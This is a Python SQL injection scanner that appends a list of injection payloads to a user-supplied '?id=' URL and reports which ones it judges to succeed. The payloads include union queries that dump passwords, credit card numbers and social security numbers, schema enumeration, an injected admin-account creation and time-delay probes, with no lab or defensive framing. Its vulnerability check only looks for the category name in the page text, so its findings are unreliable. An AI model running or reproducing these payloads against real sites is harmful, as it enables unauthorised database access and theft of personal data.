import requests
from colorama import Fore
URL = input(Fore.MAGENTA + "Url(?id=): ")
print(Fore.YELLOW + "Payloads Starting...")
payloads = {
    "error": [
        "1' AND 1=CONVERT(int, (SELECT @@version))--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND 1=3--",
        "1' AND 1=4--",
        "1' AND 1=5--",
        "1' AND 1=6--",
        "1' AND 1=7--",
        "1' AND 1=8--",
        "1' AND 1=9--",
        "' } ], $comment:'successful MongoDB injection'",
    ],
    "time": [
        "1' AND IF(1=1, SLEEP(5), 0)--",
        "1' AND IF(1=2, SLEEP(5), 0)--",
        "1' AND IF(1=3, SLEEP(5), 0)--",
        "1' AND IF(1=4, SLEEP(5), 0)--",
        "1' AND IF(1=5, SLEEP(5), 0)--",
        "1' AND IF(1=6, SLEEP(5), 0)--",
        "1' AND IF(1=7, SLEEP(5), 0)--",
        "1' AND IF(1=8, SLEEP(5), 0)--",
        "1' AND IF(1=9, SLEEP(5), 0)--",
        "1' AND IF(1=10, SLEEP(5), 0)--",
        ";waitfor delay '0:0:5'--",
        ");waitfor delay '0:0:5'--",
        "';waitfor delay '0:0:5'--",
        ";waitfor delay '0:0:5'--",
        "Or'='Or",
    ],
    "union": [
        "1' UNION ALL SELECT null--",
        "1' UNION ALL SELECT username FROM users--",
        "1' UNION ALL SELECT password FROM users--",
        "1' UNION ALL SELECT email FROM users--",
        "1' UNION ALL SELECT credit_card FROM users--",
        "1' UNION ALL SELECT address FROM users--",
        "1' UNION ALL SELECT phone_number FROM users--",
        "1' UNION ALL SELECT social_security_number FROM users--",
        "1' UNION ALL SELECT date_of_birth FROM users--",
        "1' UNION ALL SELECT last_login FROM users--",
        "1' UNION ALL SELECT null, database(), null, null, null--",
        "1' UNION ALL SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema=database()--",
        "1' UNION ALL SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_name='users'--", ],
    "order": [
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' ORDER BY 4--",
        "1' ORDER BY 5--",
        "1' ORDER BY 6--",
        "1' ORDER BY 7--",
        "1' ORDER BY 8--",
        "1' ORDER BY 9--",
        "1' ORDER BY 10--",
        "HAVING 1=1",
        "HAVING 1=0",
        "HAVING 1=1#",
        "HAVING 1=0#",
        "HAVING 1=1--",
        "HAVING 1=0--",
        "AND 1=1",
        "AND 1=0",
        "AND 1=1--",
        "AND 1=0--",
        "AND 1=1#",
        "AND 1=0#",
        "AND 1=1 AND '%'='",
        "AND 1=0 AND '%'='",
        "AND 1083=1083 AND (1427=1427",
        "AND 7300=7300 AND 'pKlZ'='pKlY",
        "AND 7300=7300 AND ('pKlZ'='pKlZ",
        "AND 7300=7300 AND ('pKlZ'='pKlY",
        "AS INJECTX WHERE 1=1 AND 1=1",
        "AS INJECTX WHERE 1=1 AND 1=0",
        "AS INJECTX WHERE 1=1 AND 1=1#",
        "AS INJECTX WHERE 1=1 AND 1=0#",
    ],
    "boolean": [
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND 1=3--",
        "1' AND 1=4--",
        "1' AND 1=5--",
        "1' AND 1=6--",
        "1' AND 1=7--",
        "1' AND 1=8--",
        "1' AND 1=9--",
        "1' AND 1=10--",
        ")%20or%20('x'='x",
        "%20or%201=1",
        "; execute immediate 'sel' || 'ect us' || 'er'",
        "benchmark(10000000,MD5(1))# update",        ";waitfor delay '0:0:__TIME__'--",
        "1) or pg_sleep(__TIME__)--",
        "' or '1'='1",
        "' or '1'='1",
        "' || myappadmin.adduser('admin', 'Password123') || '",
        "'AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))",
        "AND 'i'='i' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i",
        "1' and 1=(select count(*) from tablenames); --",
        "1",
        "1 and user_name() = 'dbo'",
        "\'; desc users; --",
        "1\'1",
    ],
}

def test_payload(newURL, injection_type):
    try:
        response = requests.get(newURL)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

    responseString = str(response.content)
    return injection_type in responseString

for injection_type, injection_values in payloads.items():
    for payload in injection_values:
        newURL = URL + payload
        is_vulnerable = test_payload(newURL, injection_type)
        if is_vulnerable:
            print(f"Vulnerable Payload! : {payload}")
